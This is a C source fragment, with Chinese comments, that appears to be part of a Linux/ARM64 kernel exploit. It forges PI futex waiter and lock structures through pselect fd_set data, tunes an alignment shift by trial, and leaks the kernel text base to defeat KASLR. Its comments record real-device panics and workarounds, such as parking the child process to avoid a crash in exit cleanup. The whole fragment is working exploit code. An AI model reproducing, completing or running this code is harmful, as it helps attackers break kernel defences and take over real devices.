   * - shift=0 已实测 NICE-ENTER panic:假标签错位,pi_blocked_on 残留处
   *   读到 fd_set 垃圾字段(prio 0x8200000003 等)当指针用。
   * - shift=3 是真机验证值。DEPTH 0 探测失败(重启)则换 SLIDE_SHIFT=n 单点验证。
   * - run2 attempt3 现象: prio=130 永不匹配 __waiter_prio(CFS)=120 的早退
   *   条件,walk 必然走到 lock 解引用 —— 崩=对齐错,早退=对齐对。 */
  int shifts[] = {3};
  int n_shifts = sizeof(shifts) / sizeof(shifts[0]);

  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    slide_word_shift = (fixed_shift != -100)
                           ? fixed_shift
                           : shifts[(attempt - 1) % n_shifts];
    /* 同一 shift: 先 DEPTH 0 早退验证, 通过后(slide_shift_verified)才全链。 */
    slide_probe_depth = (slide_word_shift == slide_shift_verified)
                            ? SLIDE_DEPTH_FULL_CHAIN
                            : SLIDE_DEPTH_EARLY_EXIT;
    pr_info("slide attempt %d depth=%d (%s) shift=%d%s\n", attempt,
            slide_probe_depth,
            slide_probe_depth == SLIDE_DEPTH_EARLY_EXIT
                ? "prio=120 early-exit: walk reads ghost prio then returns, zero deref"
                : "full chain: dequeue/enqueue/wake over fake graph",
            slide_word_shift,
            slide_word_shift == slide_shift_verified ? " (depth0 verified)" : "");

    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      pr_info("slide attempt %d page prep failed (shift=%d)\n", attempt, slide_word_shift);
      continue;
    }
    pr_info("slide attempt %d uses pselect shift=%d page=%zx lock=%zx w0=%zx task=%zx\n",
            attempt, slide_word_shift, page_base, fake_lock, fake_w0, fake_task);

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      log_slide_child_context();
      uint64_t stext = slide_child_leak_stext();
      struct slide_child_result res = {
          .stext = stext,
          .edeadlk_ok = (uint32_t)atomic_load(&slide_child_edeadlk),
          .depth = (uint32_t)slide_probe_depth,
      };
      SYSCHK(write(fds[1], &res, sizeof(res)));
      /* Park instead of _exit: exit_group kills the waiter thread, and the
       * kernel exit path auto-releases its held PI futex -> another PI chain
       * walk over the fake waiter (confirmed panic path on shennong). */
      pr_info("slide child parked pid=%d (exit_group PI cleanup avoided)\n",
              getpid());
      for (;;) {
        pause();
      }
    }

    SYSCHK(close(fds[1]));
    struct slide_child_result res = {0, 0, 0};
    ssize_t n = read(fds[0], &res, sizeof(res));
    SYSCHK(close(fds[0]));
    /* no waitpid: child parks with live waiter/owner threads */

    if (n == (ssize_t)sizeof(res) && res.edeadlk_ok &&
        res.depth == SLIDE_DEPTH_EARLY_EXIT && !res.stext &&
        slide_word_shift != slide_shift_verified) {
      /* DEPTH 0 完整跑完且没崩(能写回管道就是没崩):
       * ghost waiter 的 prio 字段读到 120 -> shift 对齐正确。 */
      slide_shift_verified = slide_word_shift;
      pr_success("slide depth0-ok pid=%d shift=%d: prio-match early-exit "
                 "survived, alignment confirmed, next attempt runs full chain\n",
                 getpid(), slide_word_shift);
    }

    if (n == (ssize_t)sizeof(res) && res.stext) {
      uint64_t stext = res.stext;
      /* 二次校验:ARM64 KASLR slide 必须 2MB 对齐且落在 1GB 内 */
      if ((stext & 0x1fffffULL) != 0 ||
          stext - KIMAGE_TEXT_BASE >= 0x40000000ULL) {
        pr_warning("slide attempt %d stext sanity fail stext=%016llx\n",
                   attempt, (unsigned long long)stext);
        continue;
      }
      kaslr_base = stext;
      kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
      kaslr_done = 1;
      pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx shift=%d depth=%d\n",
                 getpid(), (unsigned long long)kaslr_base,
                 (unsigned long long)kaslr_slide, slide_word_shift,
                 slide_probe_depth);
      return 1;
    }

    pr_warning("slide attempt %d failed n=%zd stext=%016llx edeadlk=%u shift=%d depth=%d\n",
               attempt, n, (unsigned long long)res.stext, res.edeadlk_ok,
               slide_word_shift, slide_probe_depth);
  }

  return 0;
}
